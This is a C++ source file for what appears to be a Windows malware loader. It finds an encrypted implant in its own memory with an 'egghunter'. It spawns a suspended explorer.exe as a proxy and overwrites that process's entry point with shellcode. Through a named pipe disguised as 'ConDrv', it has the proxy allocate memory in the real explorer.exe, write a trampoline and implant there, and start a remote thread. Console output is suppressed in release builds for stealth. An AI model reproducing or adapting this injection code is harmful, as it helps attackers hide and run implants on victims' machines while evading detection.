
#ifdef _DEBUG
#include <iostream>
#endif

#include "Windows.h"
#include <tlhelp32.h>
#include <winternl.h>
#include "shellcode.h"
#include <string>
#include <vector>

DWORD pid = 0;
HANDLE pipe = NULL;
SYSTEM_INFO vSysInfo;
LPCSTR process_name = "C:\\Windows\\explorer.exe";
const wchar_t* pipe_name = L"\\\\.\\pipe\\ConDrv";


char* egghunter() {
    int len = 4;
    char data[] = "w00f";
    HANDLE process = GetCurrentProcess();
    if (process)
    {
        SYSTEM_INFO si;
        GetSystemInfo(&si);

        MEMORY_BASIC_INFORMATION meminfo;
        std::vector<char> chunk;
        char* p = 0;
        while (p < si.lpMaximumApplicationAddress)
        {
            VirtualQuery(p, &meminfo, sizeof(meminfo));
            if (meminfo.Type = 0x20000 && meminfo.State == 0x1000)
            {
                p = (char*)meminfo.BaseAddress;
                chunk.resize(meminfo.RegionSize);
                SIZE_T bytesRead;
                if (ReadProcessMemory(process, p, &chunk[0], meminfo.RegionSize, &bytesRead))
                {
                    for (size_t i = 0; i < (bytesRead - len); ++i)
                    {
                        if (memcmp(&data, &chunk[i], len) == 0)
                        {

                            if (memcmp(&data, &chunk[i + 4], len) == 0)
                                return (char*)p + i + 8;

                        }
                    }
                }

            }
            p += meminfo.RegionSize;

        }
    }
    return 0;
}

typedef NTSTATUS(WINAPI* _SystemFunction032)(
    struct ustring* memoryRegion,
    struct ustring* keyPointer);

struct ustring {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} _data, key;


void FindShellcode() {
    // Get current image address
    char* shellcode = egghunter();
    int len = *(int*)shellcode;
    unsigned char* _key = (unsigned char*)shellcode + sizeof(int);
    shellcode = shellcode + sizeof(int) + 8;
    _data.Buffer = (PUCHAR)shellcode;
    _data.Length = len;
    key.Buffer = _key;
    key.Length = 8;
#ifdef _DEBUG
    if(len!=0)

    _key += (char)"\x00";
    printf("[+] Found the payload. Size: %i. \r\n", len);
#endif
}


int FindTargetProcess(const wchar_t* procname) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    int pid = 0;
    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (wcscmp(entry.szExeFile, procname) == 0)
            {
                pid = entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    if (pid != 0) {
#ifdef _DEBUG
        printf("[+] Found the %ws with pid %i\r\n", procname, pid);
#endif 
        return pid;
    }
    else {
#ifdef _DEBUG
        printf("[-] Failed to find process %ws\r\n", procname);
        
#endif
        exit(-1);
        return 0;
    }


}
#pragma comment(lib, "ntdll")
LPVOID FindProcessEntryPoint(HANDLE process) {
    PROCESS_BASIC_INFORMATION pbi = {};
    DWORD returnLength = 0;
    NtQueryInformationProcess(process, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
    DWORD64 pebOffset = (DWORD64)pbi.PebBaseAddress + 16;
    LPVOID imageBase = 0;
    ReadProcessMemory(process, (LPCVOID)pebOffset, &imageBase, 8, NULL);
    BYTE headersBuffer[4096] = {};
    ReadProcessMemory(process, (LPCVOID)imageBase, headersBuffer, 4096, NULL);
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew);
    LPVOID entrypoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD64)imageBase);
    return entrypoint;

}
void InjectProxyShellcode(HANDLE process, unsigned char shellcode[], int size) {
    LPVOID entrypoint = FindProcessEntryPoint(process);
    std::string editor(shellcode, shellcode + sizeof(shellcode));
    int pos = editor.find("AAAA");
    memcpy(&editor[0], &pid, 4);
    size_t bytesWritten = 0;
    WriteProcessMemory(process, entrypoint, shellcode, size, &bytesWritten);
#ifdef _DEBUG
    printf("[+] Injected %i bytes\r\n", bytesWritten);
#endif
}

PROCESS_INFORMATION CreateProxyProcess(LPCSTR process) {
    STARTUPINFOA startup_information = { 0 };
    PROCESS_INFORMATION process_information = { 0 };

    if (CreateProcessA(process, NULL, NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &startup_information, &process_information))
    {
#ifdef _DEBUG
        printf("[+] Spawned proxy process with pid: %i\r\n", process_information.dwProcessId);
#endif

    }
    else
    {
#ifdef _DEBUG
        printf("Failed to spawn proxy process. Exiting.\r\n");
#endif
        exit(-1);
    }
    return process_information;
}

void WriteToNamedPipe(unsigned char buffer[], int size) {
    DWORD numBytesWritten = 0;
    int result = WriteFile(
        pipe, // handle to our outbound pipe
        buffer, // data to send
        //wcslen(data) * sizeof(wchar_t), // length of data to send (bytes)
        size,
        &numBytesWritten, // will store actual amount of data sent
        NULL // not using overlapped IO
    );

    if (result) {
#ifdef _DEBUG
        printf("[+] Number of bytes sent: %i\r\n", numBytesWritten);
#endif
    }
    else {
#ifdef _DEBUG
        printf("[-] Failed to send data.\r\n");
#endif
        // look up error code here using GetLastError()
    }

}

void ReadFromNamedPipe(unsigned char buffer[], int size) {
    DWORD numBytesRead = 0;
    int result = ReadFile(
        pipe, // handle to our outbound pipe
        buffer, // data to send
        //wcslen(data) * sizeof(wchar_t), // length of data to send (bytes)
        size,
        &numBytesRead, // will store actual amount of data sent
        NULL // not using overlapped IO
    );

    if (result) {
#ifdef _DEBUG
        printf("[+] Number of bytes read: %i\r\n", numBytesRead);
#endif
    }
    else {
#ifdef _DEBUG
        printf("[-] Failed to read data.\r\n");
#endif
        // look up error code here using GetLastError()
    }

}

int ProxyCreateNamedPipe(LPVOID pipe_param) {

    pipe = CreateNamedPipe(pipe_name, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 1, 4096, 4096, 0, NULL);
    if (pipe == NULL || pipe == INVALID_HANDLE_VALUE) {
#ifdef _DEBUG
        printf("[-] Failed to created named pipe\r\n");
        
#endif
        system("pause");
        return 0;
    }

#ifdef _DEBUG
    printf("[+] Created named pipe with handle: 0x%x. Waiting for clients...\r\n", pipe);

#endif 
    BOOL result = ConnectNamedPipe(pipe, NULL);
    if (!result) {
#ifdef _DEBUG
        printf("[-] Failed to make connection to the named pipe\r\n");
        
#endif 
        system("pause");
        return 0;
    }

    return 1;
}



void PrepareAllocationShellcode() {
    int position = 0;
    FindShellcode();
    GetSystemInfo(&vSysInfo);
    long long int size = sizeof(trampoline_shellcode) + 0x1000 + _data.Length + sizeof(preimplant_shellcode);
    long long int granularitiesCount = size / vSysInfo.dwAllocationGranularity;
    long long int pagesCount = size / vSysInfo.dwPageSize;
    if (size % vSysInfo.dwAllocationGranularity > 0) {
        granularitiesCount++; // allocated additional granularity if needed
    }

    if (size % vSysInfo.dwPageSize > 0) {
        pagesCount++; // allocated additional page if needed
    }

    if (!pid) {
        exit(-1);
    }
    std::string editor(proxy_allocate, proxy_allocate + sizeof(proxy_allocate));
    position = editor.find("AAAAAAAA");
    memcpy(&proxy_allocate[position], &size, 8);
    position = editor.find("BBBB");
    memcpy(&proxy_allocate[position], &pid, 4);
    position = editor.find("CCCCCCCC");
    memcpy(&proxy_allocate[position], &granularitiesCount, 8);
    position = editor.find("DDDDDDDD");
    memcpy(&proxy_allocate[position], &pagesCount, 8);
    position = editor.find("EEEEEEEE");
    long long int granMemCount = granularitiesCount * vSysInfo.dwAllocationGranularity;
    memcpy(&proxy_allocate[position], &granMemCount, 8);
}

void PrepareTrampoline(long long int memory_implant) {
    int position = 0;
    std::string editor(trampoline_shellcode, trampoline_shellcode + sizeof(trampoline_shellcode));
    position = editor.find("AAAAAAAA");
    memcpy(&trampoline_shellcode[position], &memory_implant, 8);
    position = editor.find("BBBBBBBB");
    long long int temp = memory_implant + sizeof(preimplant_shellcode) - 1;
    memcpy(&trampoline_shellcode[position], &temp, 8);
    position = editor.find("CCCCCCCC");
    memcpy(&trampoline_shellcode[position], &_data.Length, 8);
    position = editor.find("DDDDDDDD");
    memcpy(&trampoline_shellcode[position], key.Buffer, 8);
}

void PreparePreimplant(long long int memory_trampoline, long long int memory_implant) {
    int position = 0;
    
    memory_implant += sizeof(preimplant_shellcode);
    std::string editor(preimplant_shellcode, preimplant_shellcode + sizeof(preimplant_shellcode));
    position = editor.find("AAAAAAAA");
    memcpy(&preimplant_shellcode[position], &memory_trampoline, 8);
    position = editor.find("BBBBBBBB");
    memcpy(&preimplant_shellcode[position], &memory_implant, 8);
    position = editor.find("CCCCCCCC");
    memcpy(&preimplant_shellcode[position], &_data.Length, 8);
    position = editor.find("DDDDDDDD");
    memcpy(&preimplant_shellcode[position], key.Buffer, 8);
#ifdef _DEBUG
    printf("[*] Ready to send preimplant shellcode\r\n");
#endif
}

void PrepareCreateRemoteThread(long long int memory_trampoline, long long int hProcess) {
    int position = 0;
    std::string editor(proxy_create_thread, proxy_create_thread + sizeof(proxy_create_thread));
    position = editor.find("AAAAAAAA");
    memcpy(&proxy_create_thread[position], &hProcess, 8);
    position = editor.find("BBBBBBBB");
    memcpy(&proxy_create_thread[position], &memory_trampoline, 8);
}

#ifndef _DEBUG
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#endif

int main()
{
    unsigned char buffer[4096];
    DWORD bytesRead = 0;
    STARTUPINFOA startup_information = { 0 };
    PROCESS_INFORMATION process_information = { 0 };
    pid = FindTargetProcess(L"explorer.exe");
    memset(buffer, 0, sizeof(buffer));
    PrepareAllocationShellcode();
    memcpy(buffer, proxy_allocate, sizeof(proxy_allocate));
    process_information = CreateProxyProcess(process_name);
    InjectProxyShellcode(process_information.hProcess, agent_shellcode, sizeof(agent_shellcode));
    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ProxyCreateNamedPipe, &pipe, 0, 0);
    ResumeThread(process_information.hThread);
    WaitForSingleObject(hThread, 0xffffffff);

    WriteToNamedPipe(buffer, 4096); // VirtualAllocEx shellcode
    memset(buffer, 0, 4096);
    ReadFromNamedPipe(buffer, 32);
    long long int memory_trampoline = *(long long int*)buffer;
    long long int memory_implant = *(long long int*)(buffer + 8);
    long long int hProcess = *(long long int*)(buffer + 16);
    if (memory_trampoline != 0 && memory_implant != 0 && hProcess != 0) {
#ifdef _DEBUG
        printf("[+] Proxy allocated memory for the trampoline at: %llx\r\n", memory_trampoline);
        printf("[+] Proxy allocated memory for the implant at: %llx\r\n", memory_implant);
        printf("[+] Retrieved target handle: %llx\r\n", hProcess);
#endif 
        PrepareCreateRemoteThread(memory_trampoline, pid);
    }
    else {
#ifdef _DEBUG
        printf("[-] Failed to allocate memory. Exiting.\r\n");
        
#endif 
        return -1;
    }
    memcpy(buffer, proxy_write, sizeof(proxy_write));
    WriteToNamedPipe(buffer, 4096);
    PrepareTrampoline(memory_implant);
    //PreparePreimplant(memory_trampoline, memory_implant - 1);
    unsigned char* payload_shellcode = (unsigned char*)malloc(sizeof(trampoline_shellcode) + 0x1000 + sizeof(preimplant_shellcode) + _data.Length);
    
    memset(payload_shellcode, 0, sizeof(trampoline_shellcode) + 0x1000 + sizeof(preimplant_shellcode) + _data.Length);
    memcpy(payload_shellcode, &trampoline_shellcode, sizeof(trampoline_shellcode));
    unsigned char* position = payload_shellcode + 0x1000;

    memcpy(position, &preimplant_shellcode, sizeof(preimplant_shellcode));

    position += sizeof(preimplant_shellcode) - 1;
  
    memcpy((void*)position, _data.Buffer, _data.Length);
 
    WriteToNamedPipe(payload_shellcode, sizeof(trampoline_shellcode) + 0x1000 + sizeof(preimplant_shellcode) + _data.Length);
    free(payload_shellcode);
    memset(buffer, 0, 4096);
    ReadFromNamedPipe(buffer, 32);
    memory_trampoline = *(long long int*)buffer;
    memory_implant = *(long long int*)(buffer + 8);
    if (memory_trampoline != 0 && memory_implant != 0) {
#ifdef _DEBUG
        printf("[+] Wrote %i bytes trampoline to the target\r\n", memory_trampoline);
        printf("[+] Wrote %i bytes implant to the target\r\n", memory_implant);
#endif 
    }
    else {
#ifdef _DEBUG
        printf("[-] Failed to write the payload. Exiting.\r\n");

#endif 
        return -1;
    }

    memset(buffer, 0, sizeof(buffer));
    memcpy(buffer, proxy_create_process, sizeof(proxy_create_process));
    WriteToNamedPipe(buffer, sizeof(buffer));

    CloseHandle(pipe);
    TerminateThread(hThread, 0);
    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ProxyCreateNamedPipe, &pipe, 0, 0);
    WaitForSingleObject(hThread, 0xFFFFFFFFFFFFFFFF);

 
#ifdef _DEBUG
    printf("[+] Created secondary proxy process. Creating remote thread.\r\n");
#endif 

    memset(buffer, 0, sizeof(buffer));

    memcpy(buffer, proxy_create_thread, sizeof(proxy_create_thread));
    WriteToNamedPipe(buffer, sizeof(buffer));

#ifdef _DEBUG
    printf("[+] Done!\r\n");
#endif 

}


